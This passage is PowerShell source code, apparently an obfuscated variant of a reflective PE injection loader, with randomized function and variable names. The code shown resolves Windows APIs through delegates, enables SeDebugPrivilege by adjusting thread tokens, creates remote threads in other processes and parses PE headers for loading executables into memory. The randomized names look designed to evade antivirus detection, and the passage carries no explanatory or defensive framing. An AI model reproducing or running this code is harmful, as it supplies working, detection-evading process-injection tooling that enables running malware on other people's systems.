		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}
	Function rehabilitate
	{
		$tFmeXFwi99 = New-Object System.Object
		
		$KNABkHgT99 = initialled kernel32.dll VirtualAlloc
		$pknqFeDX99 = mesa @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$mJDooBJg99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($KNABkHgT99, $pknqFeDX99)
		$tFmeXFwi99 | Add-Member NoteProperty -Name VirtualAlloc -Value $mJDooBJg99
		
		$igOufmyT99 = initialled kernel32.dll VirtualAllocEx
		$sOOmgjIR99 = mesa @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$yktCjxGx99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($igOufmyT99, $sOOmgjIR99)
		$tFmeXFwi99 | Add-Member NoteProperty -Name VirtualAllocEx -Value $yktCjxGx99
		
		$MsPgiXZA99 = initialled msvcrt.dll memcpy
		$oBsgtpSP99 = mesa @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$WRWSHxda99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MsPgiXZA99, $oBsgtpSP99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name memcpy -Value $WRWSHxda99
		
		$raeqyGgB99 = initialled msvcrt.dll memset
		$GCQuuuct99 = mesa @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$rWIPYjxf99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($raeqyGgB99, $GCQuuuct99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name memset -Value $rWIPYjxf99
		
		$lxNeLYee99 = initialled kernel32.dll LoadLibraryA
		$UTmykFpd99 = mesa @([String]) ([IntPtr])
		$CaieeGXJ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lxNeLYee99, $UTmykFpd99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $CaieeGXJ99
		
		$BliuwjTH99 = initialled kernel32.dll GetProcAddress
		$GmEHZaLU99 = mesa @([IntPtr], [String]) ([IntPtr])
		$UNawKZhc99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BliuwjTH99, $GmEHZaLU99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $UNawKZhc99
		
		$MBkcHNUx99 = initialled kernel32.dll GetProcAddress
		$bncSbEEj99 = mesa @([IntPtr], [IntPtr]) ([IntPtr])
		$byEbkKKr99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MBkcHNUx99, $bncSbEEj99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $byEbkKKr99
		
		$vguRaMiB99 = initialled kernel32.dll VirtualFree
		$AXmHpLbF99 = mesa @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$zklkaakO99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vguRaMiB99, $AXmHpLbF99)
		$tFmeXFwi99 | Add-Member NoteProperty -Name VirtualFree -Value $zklkaakO99
		
		$YwiYRXca99 = initialled kernel32.dll VirtualFreeEx
		$hDUFIenM99 = mesa @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$aQBaSKZs99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($YwiYRXca99, $hDUFIenM99)
		$tFmeXFwi99 | Add-Member NoteProperty -Name VirtualFreeEx -Value $aQBaSKZs99
		
		$qfMVdQAU99 = initialled kernel32.dll VirtualProtect
		$goaANUMN99 = mesa @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$sfENkXgV99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($qfMVdQAU99, $goaANUMN99)
		$tFmeXFwi99 | Add-Member NoteProperty -Name VirtualProtect -Value $sfENkXgV99
		
		$zAaWaXHl99 = initialled kernel32.dll GetModuleHandleA
		$fHWQJOhD99 = mesa @([String]) ([IntPtr])
		$dBvJXLYA99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($zAaWaXHl99, $fHWQJOhD99)
		$tFmeXFwi99 | Add-Member NoteProperty -Name GetModuleHandle -Value $dBvJXLYA99
		
		$PxhMtdhm99 = initialled kernel32.dll FreeLibrary
		$tZRCpBub99 = mesa @([IntPtr]) ([Bool])
		$MauIvEHv99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PxhMtdhm99, $tZRCpBub99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $MauIvEHv99
		
		$BrHkXkjm99 = initialled kernel32.dll OpenProcess
	    $mjGIefKe99 = mesa @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $fkvPvSGF99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BrHkXkjm99, $mjGIefKe99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $fkvPvSGF99
		
		$UDyttKzp99 = initialled kernel32.dll WaitForSingleObject
	    $zhKRnYdF99 = mesa @([IntPtr], [UInt32]) ([UInt32])
	    $pzCONlQK99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UDyttKzp99, $zhKRnYdF99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $pzCONlQK99
		
		$evoWgqGA99 = initialled kernel32.dll WriteProcessMemory
        $EROOysVw99 = mesa @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $PUPyzSad99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($evoWgqGA99, $EROOysVw99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $PUPyzSad99
		
		$mWbUzkPj99 = initialled kernel32.dll ReadProcessMemory
        $HOIeeAwn99 = mesa @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $YEmsyoMZ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mWbUzkPj99, $HOIeeAwn99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $YEmsyoMZ99
		
		$pWFkNtde99 = initialled kernel32.dll CreateRemoteThread
        $efTxPWfz99 = mesa @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $jpylUOOG99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pWFkNtde99, $efTxPWfz99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $jpylUOOG99
		
		$nzztxdms99 = initialled kernel32.dll GetExitCodeThread
        $dJuQSZuv99 = mesa @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $AQSOAwtE99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($nzztxdms99, $dJuQSZuv99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $AQSOAwtE99
		
		$ostobbWJ99 = initialled Advapi32.dll OpenThreadToken
        $kFIzXIsz99 = mesa @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $HHFJRnVv99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ostobbWJ99, $kFIzXIsz99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $HHFJRnVv99
		
		$ZujfnBAm99 = initialled kernel32.dll GetCurrentThread
        $fFLnMOkc99 = mesa @() ([IntPtr])
        $CLZWBgjh99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ZujfnBAm99, $fFLnMOkc99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $CLZWBgjh99
		
		$kFFSSsAy99 = initialled Advapi32.dll AdjustTokenPrivileges
        $veBObNBQ99 = mesa @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $dQCgmMrf99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($kFFSSsAy99, $veBObNBQ99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $dQCgmMrf99
		
		$MXRHmuEl99 = initialled Advapi32.dll LookupPrivilegeValueA
        $zrrbNIpM99 = mesa @([String], [String], [IntPtr]) ([Bool])
        $Lgnprqtn99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MXRHmuEl99, $zrrbNIpM99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $Lgnprqtn99
		
		$qclNqsWl99 = initialled Advapi32.dll ImpersonateSelf
        $KxGHnepr99 = mesa @([Int32]) ([Bool])
        $JafDdRpE99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($qclNqsWl99, $KxGHnepr99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $JafDdRpE99
		
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $eILFdQTH99 = initialled NtDll.dll NtCreateThreadEx
            $lEiZwRmQ99 = mesa @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $JlpyxakH99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($eILFdQTH99, $lEiZwRmQ99)
		    $tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $JlpyxakH99
        }
		
		$GrbIUhcb99 = initialled Kernel32.dll IsWow64Process
        $axKBatqc99 = mesa @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $eTzzYnAm99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GrbIUhcb99, $axKBatqc99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $eTzzYnAm99
		
		$JhmgdHAY99 = initialled Kernel32.dll CreateThread
        $nkuMBzSN99 = mesa @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $kPHUQtDY99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($JhmgdHAY99, $nkuMBzSN99)
		$tFmeXFwi99 | Add-Member -MemberType NoteProperty -Name CreateThread -Value $kPHUQtDY99
	
		$xZeGIWHY99 = initialled kernel32.dll VirtualFree
		$uVUVOBZx99 = mesa @([IntPtr])
		$BLxDuIyp99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($xZeGIWHY99, $uVUVOBZx99)
		$tFmeXFwi99 | Add-Member NoteProperty -Name LocalFree -Value $BLxDuIyp99
		return $tFmeXFwi99
	}
			
	Function brontosauri
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$eCyCWenV99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$QVziRakA99
		)
		
		[Byte[]]$WEGJIMUo99 = [BitConverter]::GetBytes($eCyCWenV99)
		[Byte[]]$UlXdufCB99 = [BitConverter]::GetBytes($QVziRakA99)
		[Byte[]]$TjvSQwia99 = [BitConverter]::GetBytes([UInt64]0)
		if ($WEGJIMUo99.Count -eq $UlXdufCB99.Count)
		{
			$PPSCXZwe99 = 0
			for ($i = 0; $i -lt $WEGJIMUo99.Count; $i++)
			{
				$Val = $WEGJIMUo99[$i] - $PPSCXZwe99
				if ($Val -lt $UlXdufCB99[$i])
				{
					$Val += 256
					$PPSCXZwe99 = 1
				}
				else
				{
					$PPSCXZwe99 = 0
				}
				
				
				[UInt16]$Sum = $Val - $UlXdufCB99[$i]
				$TjvSQwia99[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($TjvSQwia99, 0)
	}
	
	Function federally
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$eCyCWenV99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$QVziRakA99
		)
		
		[Byte[]]$WEGJIMUo99 = [BitConverter]::GetBytes($eCyCWenV99)
		[Byte[]]$UlXdufCB99 = [BitConverter]::GetBytes($QVziRakA99)
		[Byte[]]$TjvSQwia99 = [BitConverter]::GetBytes([UInt64]0)
		if ($WEGJIMUo99.Count -eq $UlXdufCB99.Count)
		{
			$PPSCXZwe99 = 0
			for ($i = 0; $i -lt $WEGJIMUo99.Count; $i++)
			{
				[UInt16]$Sum = $WEGJIMUo99[$i] + $UlXdufCB99[$i] + $PPSCXZwe99
				$TjvSQwia99[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$PPSCXZwe99 = 1
				}
				else
				{
					$PPSCXZwe99 = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($TjvSQwia99, 0)
	}
	
	Function assert
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$eCyCWenV99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$QVziRakA99
		)
		
		[Byte[]]$WEGJIMUo99 = [BitConverter]::GetBytes($eCyCWenV99)
		[Byte[]]$UlXdufCB99 = [BitConverter]::GetBytes($QVziRakA99)
		if ($WEGJIMUo99.Count -eq $UlXdufCB99.Count)
		{
			for ($i = $WEGJIMUo99.Count-1; $i -ge 0; $i--)
			{
				if ($WEGJIMUo99[$i] -gt $UlXdufCB99[$i])
				{
					return $true
				}
				elseif ($WEGJIMUo99[$i] -lt $UlXdufCB99[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	
	Function daughters
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$XSaefPfL99 = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($XSaefPfL99, 0))
	}
	
	
	Function geniuses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$KbloWTRq99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$rGTXVsBp99 = [IntPtr](federally ($StartAddress) ($Size))
		
		$vlZomopx99 = $PEInfo.EndAddress
		
		if ((assert ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $KbloWTRq99"
		}
		if ((assert ($rGTXVsBp99) ($vlZomopx99)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $KbloWTRq99"
		}
	}
	
	
	Function manufacture
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$EwGuMsLx99
		)
	
		for ($aVRFfewT99 = 0; $aVRFfewT99 -lt $Bytes.Length; $aVRFfewT99++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($EwGuMsLx99, $aVRFfewT99, $Bytes[$aVRFfewT99])
		}
	}
	
	Function mesa
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $sGQuToXU99 = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )
	    $wHKdkXRN99 = [AppDomain]::CurrentDomain
	    $tGjSKYlD99 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $zlIsVzgQ99 = $wHKdkXRN99.DefineDynamicAssembly($tGjSKYlD99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $fOKOrgux99 = $zlIsVzgQ99.DefineDynamicModule('InMemoryModule', $false)
	    $yxYoLpju99 = $fOKOrgux99.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $zaWLTDAi99 = $yxYoLpju99.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $sGQuToXU99)
	    $zaWLTDAi99.SetImplementationFlags('Runtime, Managed')
	    $yaATHDaS99 = $yxYoLpju99.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $sGQuToXU99)
	    $yaATHDaS99.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $yxYoLpju99.CreateType()
	}
	Function initialled
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $lCAZMObF99
	    )
	    $PshgTUvJ99 = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $sZiKVixh99 = $PshgTUvJ99.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    $dBvJXLYA99 = $sZiKVixh99.GetMethod('GetModuleHandle')
	    $UNawKZhc99 = $sZiKVixh99.GetMethod('GetProcAddress')
	    $DohNIytE99 = $dBvJXLYA99.Invoke($null, @($Module))
	    $vrFOLlra99 = New-Object IntPtr
	    $sxiodrDZ99 = New-Object System.Runtime.InteropServices.HandleRef($vrFOLlra99, $DohNIytE99)
	    Write-Output $UNawKZhc99.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$sxiodrDZ99, $lCAZMObF99))
	}
	
	
	Function annealed
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$tFmeXFwi99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$fsGKSFYp99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$qJLYuIGk99 = $tFmeXFwi99.GetCurrentThread.Invoke()
		if ($qJLYuIGk99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$nQWOKlsZ99 = [IntPtr]::Zero
		[Bool]$IUgPuxxH99 = $tFmeXFwi99.OpenThreadToken.Invoke($qJLYuIGk99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$nQWOKlsZ99)
		if ($IUgPuxxH99 -eq $false)
		{
			$tjrrWPHx99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($tjrrWPHx99 -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$IUgPuxxH99 = $tFmeXFwi99.ImpersonateSelf.Invoke(3)
				if ($IUgPuxxH99 -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$IUgPuxxH99 = $tFmeXFwi99.OpenThreadToken.Invoke($qJLYuIGk99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$nQWOKlsZ99)
				if ($IUgPuxxH99 -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $tjrrWPHx99"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$fsGKSFYp99.LUID))
		$IUgPuxxH99 = $tFmeXFwi99.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($IUgPuxxH99 -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}
		[UInt32]$PpvfYuSD99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$fsGKSFYp99.TOKEN_PRIVILEGES)
		[IntPtr]$rGOHLDoC99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PpvfYuSD99)
		$UecPfnRy99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($rGOHLDoC99, [Type]$fsGKSFYp99.TOKEN_PRIVILEGES)
		$UecPfnRy99.PrivilegeCount = 1
		$UecPfnRy99.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$fsGKSFYp99.LUID)
		$UecPfnRy99.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($UecPfnRy99, $rGOHLDoC99, $true)
		$IUgPuxxH99 = $tFmeXFwi99.AdjustTokenPrivileges.Invoke($nQWOKlsZ99, $false, $rGOHLDoC99, $PpvfYuSD99, [IntPtr]::Zero, [IntPtr]::Zero)
		$tjrrWPHx99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($IUgPuxxH99 -eq $false) -or ($tjrrWPHx99 -ne 0))
		{
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($rGOHLDoC99)
	}
	
	
	Function impregnation
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$gmLJonUI99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$GgUQRiWy99 = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$tFmeXFwi99
		)
		
		[IntPtr]$sXMTkzDn99 = [IntPtr]::Zero
		
		$AhfVJfBU99 = [Environment]::OSVersion.Version
		if (($AhfVJfBU99 -ge (New-Object 'Version' 6,0)) -and ($AhfVJfBU99 -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$oXrpZHcp99= $tFmeXFwi99.NtCreateThreadEx.Invoke([Ref]$sXMTkzDn99, 0x1FFFFF, [IntPtr]::Zero, $gmLJonUI99, $StartAddress, $GgUQRiWy99, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$HDeHRPwT99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($sXMTkzDn99 -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $oXrpZHcp99. LastError: $HDeHRPwT99"
			}
		}
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$sXMTkzDn99 = $tFmeXFwi99.CreateRemoteThread.Invoke($gmLJonUI99, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $GgUQRiWy99, 0, [IntPtr]::Zero)
		}
		
		if ($sXMTkzDn99 -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		
		return $sXMTkzDn99
	}
	
	Function Parcheesi
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PthOGtLn99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$fsGKSFYp99
		)
		
		$OSyzFiDu99 = New-Object System.Object
		
		$iHkDQZzW99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PthOGtLn99, [Type]$fsGKSFYp99.IMAGE_DOS_HEADER)
		[IntPtr]$IPZnZbwV99 = [IntPtr](federally ([Int64]$PthOGtLn99) ([Int64][UInt64]$iHkDQZzW99.e_lfanew))
		$OSyzFiDu99 | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $IPZnZbwV99
		$YVScrssW99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($IPZnZbwV99, [Type]$fsGKSFYp99.IMAGE_NT_HEADERS64)
		
	    if ($YVScrssW99.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($YVScrssW99.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$OSyzFiDu99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $YVScrssW99
			$OSyzFiDu99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$GKPvdBWI99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($IPZnZbwV99, [Type]$fsGKSFYp99.IMAGE_NT_HEADERS32)
			$OSyzFiDu99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $GKPvdBWI99
			$OSyzFiDu99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $OSyzFiDu99
	}
	Function emeritus
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$NJImiPos99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$fsGKSFYp99
		)
		
		$PEInfo = New-Object System.Object
		
		[IntPtr]$jMgdIhsi99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($NJImiPos99.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($NJImiPos99, 0, $jMgdIhsi99, $NJImiPos99.Length) | Out-Null
		
		$OSyzFiDu99 = Parcheesi -PthOGtLn99 $jMgdIhsi99 -fsGKSFYp99 $fsGKSFYp99
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($OSyzFiDu99.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($OSyzFiDu99.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($OSyzFiDu99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($OSyzFiDu99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($OSyzFiDu99.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($jMgdIhsi99)
		
		return $PEInfo
	}
	Function tartars
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PthOGtLn99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$fsGKSFYp99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PthOGtLn99 -eq $null -or $PthOGtLn99 -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		$OSyzFiDu99 = Parcheesi -PthOGtLn99 $PthOGtLn99 -fsGKSFYp99 $fsGKSFYp99
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PthOGtLn99
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($OSyzFiDu99.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($OSyzFiDu99.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($OSyzFiDu99.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($OSyzFiDu99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
